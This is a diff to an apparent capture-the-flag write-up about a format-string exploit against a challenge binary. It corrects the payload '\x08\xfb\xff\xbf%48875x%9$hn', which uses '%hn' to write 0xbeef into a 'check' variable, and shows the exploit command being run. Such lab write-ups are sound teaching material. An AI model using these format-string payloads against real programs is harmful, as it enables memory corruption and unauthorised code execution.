@@ -45,7 +45,7 @@ Let's try to override the first nimble of **check**.<br>
 First, we'll enter **check**'s address to the format string.<br>
 Then, we'll make sure that the output string will contain enough bytes, so 0xbeef will be written.<br>
 And for last, we'll take advantage of the "$" (control which variable will be used) and "hn" (writes the number of bytes into an int pointer) options.
-So the input should look like ```\x08\xfb\xff\xbf%48875x%9hn``` (the 48875 can be found by trial and error):
+So the input should look like ```\x08\xfb\xff\xbf%48875x%9$hn``` (the 48875 can be found by trial and error):
 ```sh
 app-systeme-ch14@challenge02:~$ ./ch14 $(python /tmp/exploit.py)
 check at 0xbffffb08
